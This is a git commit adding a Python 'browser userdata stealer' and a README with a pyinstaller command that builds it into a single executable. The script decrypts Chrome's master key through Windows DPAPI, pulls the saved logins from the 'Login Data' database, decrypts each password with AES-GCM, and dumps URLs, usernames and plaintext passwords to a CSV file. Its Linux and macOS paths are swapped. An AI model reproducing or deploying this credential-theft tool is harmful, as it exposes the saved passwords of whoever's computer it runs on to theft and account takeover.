66c5c3f26914311cb222e46ee5135acaa336cfc6
Pavlotskiy Ivan <pavlotskiy.iv@gmail.com>
2020-08-17 19:20:05 +0300

    Initial commit

---
+++ README.md
@@ -0,0 +1,6 @@
+# py_browser_userdata_stealer
+
+Python (and better) version of BrowserLoginDataExtractor.
+
+## Build
+`pyinstaller --onefile py_browser_userdata_stealer.py`
---
+++ py_browser_userdata_stealer .py
@@ -0,0 +1,112 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import sys
+import os
+import platform
+import json
+import base64
+import win32crypt
+import sqlite3
+from Crypto.Cipher import AES
+import datetime
+
+# Global variables
+out_file_name = "UserData.csv"
+
+os_name = platform.system()
+if os_name == "Windows":
+    chrome_user_data_path = os.path.normpath("%LOCALAPPDATA%/Google/Chrome/User Data")
+    chrome_user_data_path = os.path.expandvars(chrome_user_data_path)
+elif os_name == "Linux":
+    chrome_user_data_path = os.path.normpath("~/Library/Application Support/Google/Chrome")
+elif os_name == "Darwin":
+    chrome_user_data_path = os.path.normpath("~/.config/google-chrome")
+else:
+    sys.exit("Unsupported OS")
+
+chrome_login_data_path = os.path.join(chrome_user_data_path, "Default", "Login Data")
+chrome_key_path = os.path.join(chrome_user_data_path, "Local State")
+
+def filetime_to_datetime(ft):
+    EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time, the number of 100-nanosecond intervals
+    us = (ft - EPOCH_AS_FILETIME) // 10
+    return datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = us)
+
+def hunt_GoogleChrome():
+    with open(chrome_key_path, 'r', encoding='utf-8') as file:
+        data = json.load(file)
+        encrypted_key = data['os_crypt']['encrypted_key']
+
+    encrypted_key = base64.b64decode(encrypted_key)
+
+    # Key prefix for a key encrypted with DPAPI.
+    DPAPI_key_prefix = "DPAPI"
+
+    encrypted_key = encrypted_key[len(DPAPI_key_prefix):]
+
+    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+    except_appeared = False
+    try:
+        conn = sqlite3.connect(chrome_login_data_path)
+
+        curs = conn.cursor()
+        curs.execute("SELECT origin_url, username_value, password_value, date_last_used FROM logins")
+
+        login_data = curs.fetchall()
+    except sqlite3.DatabaseError as err:
+        except_appeared = True
+        print("Error: ", err)
+        print("Make sure Google Chrome is not running and try again")
+    finally:
+        conn.close()
+
+    if except_appeared:
+        return None
+
+    # Version prefix for data encrypted with profile bound key
+    version_prefix = "v10";
+
+    iv_length = 12; # 96 / 8
+    auth_tag_length = 16; # 128 / 8
+
+    with open(out_file_name, 'w') as file:
+        file.write("Google Chrome\n\n")
+        file.write("url;username;password;date_last_used\n")
+        for raw in login_data:
+            line = ";".join(raw[:-2])
+            encrypted_password = raw[2]
+            encrypted_password = encrypted_password[len(version_prefix):]
+            iv = encrypted_password[:iv_length]
+            auth_tag = encrypted_password[-auth_tag_length:]
+            encrypted_password = encrypted_password[iv_length:-auth_tag_length]
+
+            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=iv)
+            password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
+            password = password.decode("utf-8")
+
+            date_last_used = filetime_to_datetime(raw[3]*10) # time in Chrome is stored divided by 10 for some reason
+
+            line = line + ";{0};{1}".format(password, date_last_used)
+            file.write(line + "\n")
+
+# Start
+print("Console app that searches for browser user data and writes it to a .csv file\n")
+
+installed_browsers = []
+
+if os.path.exists(chrome_login_data_path):
+    installed_browsers.append("Google Chrome")
+
+if not installed_browsers:
+    sys.exit("Couldn't find any browsers on your computer")
+
+print("Detected browsers:")
+for browser in installed_browsers:
+    print(browser)
+
+if "Google Chrome" in installed_browsers:
+    hunt_GoogleChrome();
+
+print("\nFile \"{}\" has been successfully created".format(out_file_name))
